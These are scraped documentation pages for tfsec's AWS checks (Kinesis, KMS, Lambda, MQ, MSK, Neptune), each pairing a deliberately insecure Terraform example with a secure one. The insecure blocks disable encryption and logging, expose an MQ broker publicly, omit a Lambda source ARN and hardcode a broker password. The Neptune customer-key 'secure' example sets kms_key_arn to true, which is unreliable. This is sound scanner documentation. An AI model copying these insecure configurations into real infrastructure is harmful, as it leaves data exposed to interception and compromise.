{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/index.md", "content": "---\ntitle: aws\n---\n\n# aws\n\n## Services\n\n\n- [api-gateway](api-gateway)\n\n- [athena](athena)\n\n- [cloudfront](cloudfront)\n\n- [cloudtrail](cloudtrail)\n\n- [cloudwatch](cloudwatch)\n\n- [codebuild](codebuild)\n\n- [config](config)\n\n- [documentdb](documentdb)\n\n- [dynamodb](dynamodb)\n\n- [ec2](ec2)\n\n- [ecr](ecr)\n\n- [ecs](ecs)\n\n- [efs](efs)\n\n- [eks](eks)\n\n- [elastic-search](elastic-search)\n\n- [elasticache](elasticache)\n\n- [elb](elb)\n\n- [emr](emr)\n\n- [iam](iam)\n\n- [kinesis](kinesis)\n\n- [kms](kms)\n\n- [lambda](lambda)\n\n- [mq](mq)\n\n- [msk](msk)\n\n- [neptune](neptune)\n\n- [rds](rds)\n\n- [redshift](redshift)\n\n- [s3](s3)\n\n- [sns](sns)\n\n- [sqs](sqs)\n\n- [ssm](ssm)\n\n- [workspaces](workspaces)\n\n\n", "timestamp": "2025-10-24T22:24:19.647266"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/kinesis/enable-in-transit-encryption/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/kinesis/enable-in-transit-encryption/index.md", "content": "---\ntitle: Kinesis stream is unencrypted.\n---\n\n# Kinesis stream is unencrypted.\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nKinesis streams should be encrypted to ensure sensitive data is kept private. Additionally, non-default KMS keys should be used so granularity of access control can be ensured.\n\n### Possible Impact\nIntercepted data can be read in transit\n\n### Suggested Resolution\nEnable in transit encryption\n\n\n### Insecure Example\n\nThe following example will fail the aws-kinesis-enable-in-transit-encryption check.\n```terraform\n\n resource \"aws_kinesis_stream\" \"bad_example\" {\n \tencryption_type = \"NONE\"\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-kinesis-enable-in-transit-encryption check.\n```terraform\n\n resource \"aws_kinesis_stream\" \"good_example\" {\n \tencryption_type = \"KMS\"\n \tkms_key_id = \"my/special/key\"\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/kinesis_stream#encryption_type](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/kinesis_stream#encryption_type){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/streams/latest/dev/server-side-encryption.html](https://docs.aws.amazon.com/streams/latest/dev/server-side-encryption.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:20.118944"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/kms/auto-rotate-keys/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/kms/auto-rotate-keys/index.md", "content": "---\ntitle: A KMS key is not configured to auto-rotate.\n---\n\n# A KMS key is not configured to auto-rotate.\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\nYou should configure your KMS keys to auto rotate to maintain security and defend against compromise.\n\n### Possible Impact\nLong life KMS keys increase the attack surface when compromised\n\n### Suggested Resolution\nConfigure KMS key to auto rotate\n\n\n### Insecure Example\n\nThe following example will fail the aws-kms-auto-rotate-keys check.\n```terraform\n\n resource \"aws_kms_key\" \"bad_example\" {\n \tenable_key_rotation = false\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-kms-auto-rotate-keys check.\n```terraform\n\n resource \"aws_kms_key\" \"good_example\" {\n \tenable_key_rotation = true\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/kms_key#enable_key_rotation](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/kms_key#enable_key_rotation){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/kms/latest/developerguide/rotate-keys.html](https://docs.aws.amazon.com/kms/latest/developerguide/rotate-keys.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:20.772707"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/lambda/enable-tracing/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/lambda/enable-tracing/index.md", "content": "---\ntitle: Lambda functions should have X-Ray tracing enabled\n---\n\n# Lambda functions should have X-Ray tracing enabled\n\n### Default Severity: <span class=\"severity low\">low</span>\n\n### Explanation\n\nX-Ray tracing enables end-to-end debugging and analysis of all function activity. This will allow for identifying bottlenecks, slow downs and timeouts.\n\n### Possible Impact\nWithout full tracing enabled it is difficult to trace the flow of logs\n\n### Suggested Resolution\nEnable tracing\n\n\n### Insecure Example\n\nThe following example will fail the aws-lambda-enable-tracing check.\n```terraform\n\n resource \"aws_iam_role\" \"iam_for_lambda\" {\n   name = \"iam_for_lambda\"\n \n   assume_role_policy = <<EOF\n {\n   \"Version\": \"2012-10-17\",\n   \"Statement\": [\n     {\n       \"Action\": \"sts:AssumeRole\",\n       \"Principal\": {\n         \"Service\": \"lambda.amazonaws.com\"\n       },\n       \"Effect\": \"Allow\",\n       \"Sid\": \"\"\n     }\n   ]\n }\n EOF\n }\n \n resource \"aws_lambda_function\" \"bad_example\" {\n   filename      = \"lambda_function_payload.zip\"\n   function_name = \"lambda_function_name\"\n   role          = aws_iam_role.iam_for_lambda.arn\n   handler       = \"exports.test\"\n \n   # The filebase64sha256() function is available in Terraform 0.11.12 and later\n   # For Terraform 0.11.11 and earlier, use the base64sha256() function and the file() function:\n   # source_code_hash = \"${base64sha256(file(\"lambda_function_payload.zip\"))}\"\n   source_code_hash = filebase64sha256(\"lambda_function_payload.zip\")\n \n   runtime = \"nodejs12.x\"\n \n   environment {\n     variables = {\n       foo = \"bar\"\n     }\n   }\n   tracing_config {\n     mode = \"Passthrough\"\n   }\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-lambda-enable-tracing check.\n```terraform\n\n resource \"aws_iam_role\" \"iam_for_lambda\" {\n   name = \"iam_for_lambda\"\n \n   assume_role_policy = <<EOF\n {\n   \"Version\": \"2012-10-17\",\n   \"Statement\": [\n     {\n       \"Action\": \"sts:AssumeRole\",\n       \"Principal\": {\n         \"Service\": \"lambda.amazonaws.com\"\n       },\n       \"Effect\": \"Allow\",\n       \"Sid\": \"\"\n     }\n   ]\n }\n EOF\n }\n \n resource \"aws_lambda_function\" \"good_example\" {\n   filename      = \"lambda_function_payload.zip\"\n   function_name = \"lambda_function_name\"\n   role          = aws_iam_role.iam_for_lambda.arn\n   handler       = \"exports.test\"\n \n   # The filebase64sha256() function is available in Terraform 0.11.12 and later\n   # For Terraform 0.11.11 and earlier, use the base64sha256() function and the file() function:\n   # source_code_hash = \"${base64sha256(file(\"lambda_function_payload.zip\"))}\"\n   source_code_hash = filebase64sha256(\"lambda_function_payload.zip\")\n \n   runtime = \"nodejs12.x\"\n \n   environment {\n     variables = {\n       foo = \"bar\"\n     }\n   }\n   tracing_config {\n     mode = \"Active\"\n   }\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/lambda_function#mode](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/lambda_function#mode){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/lambda/latest/dg/services-xray.html](https://docs.aws.amazon.com/lambda/latest/dg/services-xray.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:21.298310"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/lambda/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/lambda/index.md", "content": "---\ntitle: lambda\n---\n\n# lambda\n\n## Checks\n\n\n- [enable-tracing](enable-tracing) Lambda functions should have X-Ray tracing enabled\n\n- [restrict-source-arn](restrict-source-arn) Ensure that lambda function permission has a source arn specified\n\n\n\n", "timestamp": "2025-10-24T22:24:21.403789"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/lambda/restrict-source-arn/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/lambda/restrict-source-arn/index.md", "content": "---\ntitle: Ensure that lambda function permission has a source arn specified\n---\n\n# Ensure that lambda function permission has a source arn specified\n\n### Default Severity: <span class=\"severity critical\">critical</span>\n\n### Explanation\n\nWhen the principal is an AWS service, the ARN of the specific resource within that service to grant permission to. \n\nWithout this, any resource from principal will be granted permission – even if that resource is from another account. \n\nFor S3, this should be the ARN of the S3 Bucket. For CloudWatch Events, this should be the ARN of the CloudWatch Events Rule. For API Gateway, this should be the ARN of the API\n\n### Possible Impact\nNot providing the source ARN allows any resource from principal, even from other accounts\n\n### Suggested Resolution\nAlways provide a source arn for Lambda permissions\n\n\n### Insecure Example\n\nThe following example will fail the aws-lambda-restrict-source-arn check.\n```terraform\n\nresource \"aws_lambda_permission\" \"bad_example\" {\n\tstatement_id = \"AllowExecutionFromSNS\"\n\taction = \"lambda:InvokeFunction\"\n\tfunction_name = aws_lambda_function.func.function_name\n\tprincipal = \"sns.amazonaws.com\"\n}\n\t\t\n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-lambda-restrict-source-arn check.\n```terraform\n\nresource \"aws_lambda_permission\" \"good_example\" {\n\tstatement_id = \"AllowExecutionFromSNS\"\n\taction = \"lambda:InvokeFunction\"\n\tfunction_name = aws_lambda_function.func.function_name\n\tprincipal = \"sns.amazonaws.com\"\n\tsource_arn = aws_sns_topic.default.arn\n}\n\t\t\n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/lambda_permission](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/lambda_permission){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-lambda-permission.html](https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-lambda-permission.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:21.674136"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/mq/enable-audit-logging/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/mq/enable-audit-logging/index.md", "content": "---\ntitle: MQ Broker should have audit logging enabled\n---\n\n# MQ Broker should have audit logging enabled\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\nLogging should be enabled to allow tracing of issues and activity to be investigated more fully. Logs provide additional information and context which is often invalauble during investigation\n\n### Possible Impact\nWithout audit logging it is difficult to trace activity in the MQ broker\n\n### Suggested Resolution\nEnable audit logging\n\n\n### Insecure Example\n\nThe following example will fail the aws-mq-enable-audit-logging check.\n```terraform\n\n resource \"aws_mq_broker\" \"bad_example\" {\n   broker_name = \"example\"\n \n   configuration {\n     id       = aws_mq_configuration.test.id\n     revision = aws_mq_configuration.test.latest_revision\n   }\n \n   engine_type        = \"ActiveMQ\"\n   engine_version     = \"5.15.0\"\n   host_instance_type = \"mq.t2.micro\"\n   security_groups    = [aws_security_group.test.id]\n \n   user {\n     username = \"ExampleUser\"\n     password = \"MindTheGap\"\n   }\n   logs {\n     audit = false\n   }\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-mq-enable-audit-logging check.\n```terraform\n\n resource \"aws_mq_broker\" \"good_example\" {\n   broker_name = \"example\"\n \n   configuration {\n     id       = aws_mq_configuration.test.id\n     revision = aws_mq_configuration.test.latest_revision\n   }\n \n   engine_type        = \"ActiveMQ\"\n   engine_version     = \"5.15.0\"\n   host_instance_type = \"mq.t2.micro\"\n   security_groups    = [aws_security_group.test.id]\n \n   user {\n     username = \"ExampleUser\"\n     password = \"MindTheGap\"\n   }\n   logs {\n     audit = true\n   }\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/mq_broker#audit](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/mq_broker#audit){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/amazon-mq/latest/developer-guide/configure-logging-monitoring-activemq.html](https://docs.aws.amazon.com/amazon-mq/latest/developer-guide/configure-logging-monitoring-activemq.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:22.126560"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/mq/enable-general-logging/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/mq/enable-general-logging/index.md", "content": "---\ntitle: MQ Broker should have general logging enabled\n---\n\n# MQ Broker should have general logging enabled\n\n### Default Severity: <span class=\"severity low\">low</span>\n\n### Explanation\n\nLogging should be enabled to allow tracing of issues and activity to be investigated more fully. Logs provide additional information and context which is often invalauble during investigation\n\n### Possible Impact\nWithout logging it is difficult to trace issues\n\n### Suggested Resolution\nEnable general logging\n\n\n### Insecure Example\n\nThe following example will fail the aws-mq-enable-general-logging check.\n```terraform\n\n resource \"aws_mq_broker\" \"bad_example\" {\n   broker_name = \"example\"\n \n   configuration {\n     id       = aws_mq_configuration.test.id\n     revision = aws_mq_configuration.test.latest_revision\n   }\n \n   engine_type        = \"ActiveMQ\"\n   engine_version     = \"5.15.0\"\n   host_instance_type = \"mq.t2.micro\"\n   security_groups    = [aws_security_group.test.id]\n \n   user {\n     username = \"ExampleUser\"\n     password = \"MindTheGap\"\n   }\n   logs {\n     general = false\n   }\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-mq-enable-general-logging check.\n```terraform\n\n resource \"aws_mq_broker\" \"good_example\" {\n   broker_name = \"example\"\n \n   configuration {\n     id       = aws_mq_configuration.test.id\n     revision = aws_mq_configuration.test.latest_revision\n   }\n \n   engine_type        = \"ActiveMQ\"\n   engine_version     = \"5.15.0\"\n   host_instance_type = \"mq.t2.micro\"\n   security_groups    = [aws_security_group.test.id]\n \n   user {\n     username = \"ExampleUser\"\n     password = \"MindTheGap\"\n   }\n   logs {\n     general = true\n   }\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/mq_broker#general](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/mq_broker#general){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/amazon-mq/latest/developer-guide/configure-logging-monitoring-activemq.html](https://docs.aws.amazon.com/amazon-mq/latest/developer-guide/configure-logging-monitoring-activemq.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:22.418156"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/mq/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/mq/index.md", "content": "---\ntitle: mq\n---\n\n# mq\n\n## Checks\n\n\n- [enable-audit-logging](enable-audit-logging) MQ Broker should have audit logging enabled\n\n- [enable-general-logging](enable-general-logging) MQ Broker should have general logging enabled\n\n- [no-public-access](no-public-access) Ensure MQ Broker is not publicly exposed\n\n\n\n", "timestamp": "2025-10-24T22:24:22.528428"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/mq/no-public-access/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/mq/no-public-access/index.md", "content": "---\ntitle: Ensure MQ Broker is not publicly exposed\n---\n\n# Ensure MQ Broker is not publicly exposed\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nPublic access of the MQ broker should be disabled and only allow routes to applications that require access.\n\n### Possible Impact\nPublicly accessible MQ Broker may be vulnerable to compromise\n\n### Suggested Resolution\nDisable public access when not required\n\n\n### Insecure Example\n\nThe following example will fail the aws-mq-no-public-access check.\n```terraform\n\n resource \"aws_mq_broker\" \"bad_example\" {\n   broker_name = \"example\"\n \n   configuration {\n     id       = aws_mq_configuration.test.id\n     revision = aws_mq_configuration.test.latest_revision\n   }\n \n   engine_type        = \"ActiveMQ\"\n   engine_version     = \"5.15.0\"\n   host_instance_type = \"mq.t2.micro\"\n   security_groups    = [aws_security_group.test.id]\n \n   user {\n     username = \"ExampleUser\"\n     password = \"MindTheGap\"\n   }\n   publicly_accessible = true\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-mq-no-public-access check.\n```terraform\n\n resource \"aws_mq_broker\" \"good_example\" {\n   broker_name = \"example\"\n \n   configuration {\n     id       = aws_mq_configuration.test.id\n     revision = aws_mq_configuration.test.latest_revision\n   }\n \n   engine_type        = \"ActiveMQ\"\n   engine_version     = \"5.15.0\"\n   host_instance_type = \"mq.t2.micro\"\n   security_groups    = [aws_security_group.test.id]\n \n   user {\n     username = \"ExampleUser\"\n     password = \"MindTheGap\"\n   }\n   publicly_accessible = false\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/mq_broker#publicly_accessible](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/mq_broker#publicly_accessible){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/amazon-mq/latest/developer-guide/using-amazon-mq-securely.html#prefer-brokers-without-public-accessibility](https://docs.aws.amazon.com/amazon-mq/latest/developer-guide/using-amazon-mq-securely.html#prefer-brokers-without-public-accessibility){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:22.820385"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/msk/enable-in-transit-encryption/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/msk/enable-in-transit-encryption/index.md", "content": "---\ntitle: A MSK cluster allows unencrypted data in transit.\n---\n\n# A MSK cluster allows unencrypted data in transit.\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nEncryption should be forced for Kafka clusters, including for communication between nodes. This ensure sensitive data is kept private.\n\n### Possible Impact\nIntercepted data can be read in transit\n\n### Suggested Resolution\nEnable in transit encryption\n\n\n### Insecure Example\n\nThe following example will fail the aws-msk-enable-in-transit-encryption check.\n```terraform\n\n resource \"aws_msk_cluster\" \"bad_example\" {\n \tencryption_info {\n \t\tencryption_in_transit {\n \t\t\tclient_broker = \"TLS_PLAINTEXT\"\n \t\t\tin_cluster = true\n \t\t}\n \t}\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-msk-enable-in-transit-encryption check.\n```terraform\n\n resource \"aws_msk_cluster\" \"good_example\" {\n \tencryption_info {\n \t\tencryption_in_transit {\n \t\t\tclient_broker = \"TLS\"\n \t\t\tin_cluster = true\n \t\t}\n \t}\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/msk_cluster#encryption_info-argument-reference](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/msk_cluster#encryption_info-argument-reference){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/msk/latest/developerguide/msk-encryption.html](https://docs.aws.amazon.com/msk/latest/developerguide/msk-encryption.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:23.275333"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/msk/enable-logging/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/msk/enable-logging/index.md", "content": "---\ntitle: Ensure MSK Cluster logging is enabled\n---\n\n# Ensure MSK Cluster logging is enabled\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\nManaged streaming for Kafka can log to Cloud Watch, Kinesis Firehose and S3, at least one of these locations should be logged to\n\n### Possible Impact\nWithout logging it is difficult to trace issues\n\n### Suggested Resolution\nEnable logging\n\n\n### Insecure Example\n\nThe following example will fail the aws-msk-enable-logging check.\n```terraform\n\n resource \"aws_msk_cluster\" \"example\" {\n   cluster_name           = \"example\"\n   kafka_version          = \"2.4.1\"\n   number_of_broker_nodes = 3\n \n   broker_node_group_info {\n     instance_type   = \"kafka.m5.large\"\n     ebs_volume_size = 1000\n     client_subnets = [\n       aws_subnet.subnet_az1.id,\n       aws_subnet.subnet_az2.id,\n       aws_subnet.subnet_az3.id,\n     ]\n     security_groups = [aws_security_group.sg.id]\n   }\n   tags = {\n     foo = \"bar\"\n   }\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-msk-enable-logging check.\n```terraform\n\n resource \"aws_msk_cluster\" \"example\" {\n   cluster_name           = \"example\"\n   kafka_version          = \"2.4.1\"\n   number_of_broker_nodes = 3\n \n   broker_node_group_info {\n     instance_type   = \"kafka.m5.large\"\n     ebs_volume_size = 1000\n     client_subnets = [\n       aws_subnet.subnet_az1.id,\n       aws_subnet.subnet_az2.id,\n       aws_subnet.subnet_az3.id,\n     ]\n     security_groups = [aws_security_group.sg.id]\n   }\n \n   logging_info {\n     broker_logs {\n       firehose {\n         enabled         = false\n         delivery_stream = aws_kinesis_firehose_delivery_stream.test_stream.name\n       }\n       s3 {\n         enabled = true\n         bucket  = aws_s3_bucket.bucket.id\n         prefix  = \"logs/msk-\"\n       }\n     }\n   }\n \n   tags = {\n     foo = \"bar\"\n   }\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/msk_cluster#](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/msk_cluster#){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/msk/latest/developerguide/msk-logging.html](https://docs.aws.amazon.com/msk/latest/developerguide/msk-logging.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:23.571965"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/msk/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/msk/index.md", "content": "---\ntitle: msk\n---\n\n# msk\n\n## Checks\n\n\n- [enable-in-transit-encryption](enable-in-transit-encryption) A MSK cluster allows unencrypted data in transit.\n\n- [enable-logging](enable-logging) Ensure MSK Cluster logging is enabled\n\n\n\n", "timestamp": "2025-10-24T22:24:23.678195"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/neptune/enable-log-export/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/neptune/enable-log-export/index.md", "content": "---\ntitle: Neptune logs export should be enabled\n---\n\n# Neptune logs export should be enabled\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\nNeptune does not have auditing by default. To ensure that you are able to accurately audit the usage of your Neptune instance you should enable export logs.\n\n### Possible Impact\nLimited visibility of audit trail for changes to Neptune\n\n### Suggested Resolution\nEnable export logs\n\n\n### Insecure Example\n\nThe following example will fail the aws-neptune-enable-log-export check.\n```terraform\n\n resource \"aws_neptune_cluster\" \"bad_example\" {\n   cluster_identifier                  = \"neptune-cluster-demo\"\n   engine                              = \"neptune\"\n   backup_retention_period             = 5\n   preferred_backup_window             = \"07:00-09:00\"\n   skip_final_snapshot                 = true\n   iam_database_authentication_enabled = true\n   apply_immediately                   = true\n   enable_cloudwatch_logs_exports      = []\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-neptune-enable-log-export check.\n```terraform\n\n resource \"aws_neptune_cluster\" \"good_example\" {\n   cluster_identifier                  = \"neptune-cluster-demo\"\n   engine                              = \"neptune\"\n   backup_retention_period             = 5\n   preferred_backup_window             = \"07:00-09:00\"\n   skip_final_snapshot                 = true\n   iam_database_authentication_enabled = true\n   apply_immediately                   = true\n   enable_cloudwatch_logs_exports      = [\"audit\"]\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/neptune_cluster#enable_cloudwatch_logs_exports](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/neptune_cluster#enable_cloudwatch_logs_exports){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/neptune/latest/userguide/auditing.html](https://docs.aws.amazon.com/neptune/latest/userguide/auditing.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:24.109141"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/neptune/enable-storage-encryption/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/neptune/enable-storage-encryption/index.md", "content": "---\ntitle: Neptune storage must be encrypted at rest\n---\n\n# Neptune storage must be encrypted at rest\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nEncryption of Neptune storage ensures that if their is compromise of the disks, the data is still protected.\n\n### Possible Impact\nUnencrypted sensitive data is vulnerable to compromise.\n\n### Suggested Resolution\nEnable encryption of Neptune storage\n\n\n### Insecure Example\n\nThe following example will fail the aws-neptune-enable-storage-encryption check.\n```terraform\n\n resource \"aws_neptune_cluster\" \"bad_example\" {\n   cluster_identifier                  = \"neptune-cluster-demo\"\n   engine                              = \"neptune\"\n   backup_retention_period             = 5\n   preferred_backup_window             = \"07:00-09:00\"\n   skip_final_snapshot                 = true\n   iam_database_authentication_enabled = true\n   apply_immediately                   = true\n   storage_encrypted                   = false\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-neptune-enable-storage-encryption check.\n```terraform\n\n resource \"aws_neptune_cluster\" \"good_example\" {\n   cluster_identifier                  = \"neptune-cluster-demo\"\n   engine                              = \"neptune\"\n   backup_retention_period             = 5\n   preferred_backup_window             = \"07:00-09:00\"\n   skip_final_snapshot                 = true\n   iam_database_authentication_enabled = true\n   apply_immediately                   = true\n   storage_encrypted                   = true\n   kms_key_arn                         = aws_kms_key.example.arn\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/neptune_cluster#storage_encrypted](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/neptune_cluster#storage_encrypted){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/neptune/latest/userguide/encrypt.html](https://docs.aws.amazon.com/neptune/latest/userguide/encrypt.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:24.457759"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/neptune/encryption-customer-key/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/neptune/encryption-customer-key/index.md", "content": "---\ntitle: Neptune encryption should use Customer Managed Keys\n---\n\n# Neptune encryption should use Customer Managed Keys\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nEncryption using AWS keys provides protection for your Neptune underlying storage. To increase control of the encryption and manage factors like rotation use customer managed keys.\n\n### Possible Impact\nUsing AWS managed keys does not allow for fine grained control\n\n### Suggested Resolution\nEnable encryption using customer managed keys\n\n\n### Insecure Example\n\nThe following example will fail the aws-neptune-encryption-customer-key check.\n```terraform\n\n resource \"aws_neptune_cluster\" \"bad_example\" {\n   cluster_identifier                  = \"neptune-cluster-demo\"\n   engine                              = \"neptune\"\n   backup_retention_period             = 5\n   preferred_backup_window             = \"07:00-09:00\"\n   skip_final_snapshot                 = true\n   iam_database_authentication_enabled = true\n   apply_immediately                   = true\n   storage_encrypted                   = false\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-neptune-encryption-customer-key check.\n```terraform\n\n resource \"aws_neptune_cluster\" \"good_example\" {\n   cluster_identifier                  = \"neptune-cluster-demo\"\n   engine                              = \"neptune\"\n   backup_retention_period             = 5\n   preferred_backup_window             = \"07:00-09:00\"\n   skip_final_snapshot                 = true\n   iam_database_authentication_enabled = true\n   apply_immediately                   = true\n   storage_encrypted                   = true\n   kms_key_arn                         = true\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/neptune_cluster#storage_encrypted](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/neptune_cluster#storage_encrypted){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/neptune/latest/userguide/encrypt.html](https://docs.aws.amazon.com/neptune/latest/userguide/encrypt.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:24.738118"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/neptune/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/neptune/index.md", "content": "---\ntitle: neptune\n---\n\n# neptune\n\n## Checks\n\n\n- [enable-log-export](enable-log-export) Neptune logs export should be enabled\n\n- [enable-storage-encryption](enable-storage-encryption) Neptune storage must be encrypted at rest\n\n- [encryption-customer-key](encryption-customer-key) Neptune encryption should use Customer Managed Keys\n\n\n\n", "timestamp": "2025-10-24T22:24:24.838241"}
